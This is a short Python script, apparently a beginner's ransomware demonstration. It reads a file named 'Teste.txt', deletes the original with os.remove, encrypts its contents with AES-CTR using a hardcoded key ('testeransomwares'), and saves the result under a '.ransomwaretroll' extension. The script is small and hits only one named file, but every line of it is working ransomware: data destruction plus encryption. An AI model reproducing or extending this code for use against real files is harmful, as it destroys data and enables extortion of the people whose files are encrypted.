import os
import pyaes

# Open file

file_name = 'Teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#Remove file origin
os.remove(file_name)

#Encrypt key

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#crypto file
crypto_data = aes.encrypt(file_data)

#Save file crypt
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()